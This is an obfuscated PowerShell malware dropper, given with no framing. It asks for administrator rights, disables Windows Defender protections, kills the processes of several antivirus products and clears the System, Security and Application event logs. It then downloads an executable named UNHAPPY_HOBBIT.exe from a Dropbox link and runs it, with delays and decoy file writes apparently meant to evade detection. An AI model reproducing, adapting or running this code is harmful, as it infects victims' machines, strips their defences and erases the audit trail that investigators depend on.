# Encoded and obfuscated PowerShell script with renamed functions and variables
Function pA5Xh7 {
    [OutputType([bool])]
    try {
        $q9Ts7k = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
        $q9Ts7k.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $false
    }
}

if (-not (pA5Xh7)) {
    $yU8pL1 = "& '" + $myInvocation.MyCommand.Definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $yU8pL1
    exit
}

Function zV7Xq6 {
    $rW3Zb9 = "$env:TEMP\wM4Bv9.txt"
    Out-File -FilePath $rW3Zb9 -InputObject "Test File"
    Start-Sleep -Seconds 2
    Remove-Item $rW3Zb9
}

zV7Xq6
Start-Sleep -Seconds 10

$oL8M5r = [System.Environment]::OSVersion.Version
$oF6Rk = [System.Environment]::OSVersion.VersionString

if ($oL8M5r.Major -eq 10) {
    $uT2Rp = "Win10"
} elseif ($oL8M5r.Major -eq 6 -and $oL8M5r.Minor -eq 3) {
    $uT2Rp = "Win81"
} elseif ($oL8M5r.Major -eq 6 -and $oL8M5r.Minor -eq 1) {
    $uT2Rp = "Win7"
} else {
    Write-Output "Unsupported OS"
    exit
}

zV7Xq6
Start-Sleep -Seconds 5

Function sP3Yq1 {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisablePrivacyMode $true
    Start-Sleep -Seconds 3
}
sP3Yq1

Function rH6Pb8 {
    $vR1Km = @("avast", "avg", "mcafee", "sophos", "kaspersky")
    foreach ($aT7Qj in $vR1Km) {
        $pS9Vf = Get-Process -Name $aT7Qj -ErrorAction SilentlyContinue
        if ($pS9Vf) {
            Stop-Process -Name $aT7Qj -Force
            Start-Sleep -Seconds 2
        }
    }
}
rH6Pb8

Function kX5Jc2 {
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    Start-Sleep -Seconds 2
}
kX5Jc2

Start-Sleep -Seconds 7

if ($uT2Rp -eq "Win10") {
    $eV7Wq = "https://www.dropbox.com/scl/fi/xo3dgfovon4knc8vegiov/UNHAPPY_HOBBIT.exe?rlkey=q8z8z771r7j9df42st2ilcg1w&dl=1"
    $gQ9Tr = "$env:TEMP\yX8Lb.exe"
} elseif ($uT2Rp -eq "Win81") {
    $eV7Wq = "https://www.dropbox.com/scl/fi/xo3dgfovon4knc8vegiov/UNHAPPY_HOBBIT.exe?rlkey=q8z8z771r7j9df42st2ilcg1w&dl=1e"
    $gQ9Tr = "$env:TEMP\yX8Lb.exe"
} elseif ($uT2Rp -eq "Win7") {
    $eV7Wq = "https://www.dropbox.com/scl/fi/xo3dgfovon4knc8vegiov/UNHAPPY_HOBBIT.exe?rlkey=q8z8z771r7j9df42st2ilcg1w&dl=1"
    $gQ9Tr = "$env:TEMP\yX8Lb.exe"
} else {
    Write-Output "Unsupported OS"
    exit
}

zV7Xq6

Invoke-WebRequest -Uri $eV7Wq -OutFile $gQ9Tr

Start-Sleep -Seconds 5

Start-Process -FilePath $gQ9Tr -NoNewWindow -Wait
